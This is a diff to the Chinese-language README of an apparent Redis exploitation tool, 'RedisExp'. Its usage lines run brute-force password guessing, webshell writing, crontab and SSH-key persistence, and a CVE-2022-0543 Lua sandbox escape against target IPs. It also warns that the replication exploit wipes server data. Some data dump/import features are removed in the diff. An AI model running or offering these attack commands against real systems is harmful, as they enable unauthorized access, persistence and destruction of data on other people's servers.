@@ -45,23 +45,14 @@ RedisExp.exe -rhost 192.168.211.131 -brute -pwdf ../pass.txt
 执行 Redis 命令:
 RedisExp.exe -rhost 192.168.211.131 -cli
 
-导出 Redis 数据:
-RedisExp.exe -rhost 192.168.211.131 -dump
-
-导入 Redis 数据:
-RedisExp.exe -rhost 192.168.211.131 -import
 ```
 
 ```
 cmd
-├── crontab.txt    默认写入的Linux下的crontab定时任务文件，用前需要修改
 ├── exp.dll        默认导入的Windows Redis模块
 ├── exp.so         导入的Linux Redis模块
 ├── main.go        编译攻击主程序
-├── out.json       导出导入的 Redis 数据
 ├── pass.txt       爆破字典
-├── shell.txt      默认写入的 Webshell 文件，用前需要修改
-└── ssh.txt        默认写入的Linux下的ssh公钥文件，用前需要修改
 
 ```
 
@@ -78,16 +69,6 @@ cmd
 **主从复制会清空数据，主从复制会清空数据，主从复制会清空数据，请注意使用！请注意使用！请注意使用！**
 
 ------
-
-### 暂时解决的方法
-
-1、默认导出 db0 的 Redis 数据，其他的不会导出，如果其他db有数据也会被清空。
-
-2、利用主从复制漏洞
-
-3、导入 Redis 数据
-
-> **主从复制默认调用了 导出 Redis 数据  和 导入数据，也可以主动导出和导入。**
 
 
 
@@ -169,7 +150,11 @@ RedisExp.exe -rhost 192.168.211.131 -shell
 
 ![](images/webshell.png)
 
-#### Linux写计划任务
+
+
+### Linux写计划任务
+
+没搭建环境测试
 
 ```
 RedisExp.exe -rhost 192.168.211.133 -crontab
@@ -177,13 +162,19 @@ RedisExp.exe -rhost 192.168.211.133 -crontab
 
 ![](images/crontab.png)
 
-#### Linux写SSH公钥
+
+
+### Linux写SSH公钥
+
+没搭建环境测试
 
 ```
 RedisExp.exe -rhost 192.168.211.133 -ssh
 ```
 
 ![](images/ssh.png)
+
+
 
 ### Lua沙盒绕过命令执行 CVE-2022-0543
 
